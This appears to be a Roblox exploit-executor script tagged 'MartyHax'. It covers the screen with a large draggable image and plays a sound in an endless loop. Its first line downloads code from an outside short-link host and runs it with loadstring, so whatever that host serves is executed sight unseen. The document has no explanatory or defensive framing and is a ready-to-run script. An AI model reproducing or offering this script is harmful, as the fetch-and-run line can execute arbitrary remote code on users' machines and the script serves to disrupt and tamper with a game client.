loadstring(game:HttpGet("https://shhh.lol/R671UN"))

local ScreenGui = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")

ScreenGui.Parent = game.CoreGui

ImageLabel.Parent = ScreenGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Size = UDim2.new(0, 1321, 0, 810)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8694934460"
ImageLabel.Active = true
ImageLabel.Draggable = true

getgenv().MartyHaxSound = true

while MartyHaxSound == true do
local sound = Instance.new("Sound", game.Workspace)
sound.SoundId = "rbxassetid://3200130016"

if not sound.IsLoaded then
    sound.Loaded:Wait()
end

sound:Play()
task.wait(5.5)
end
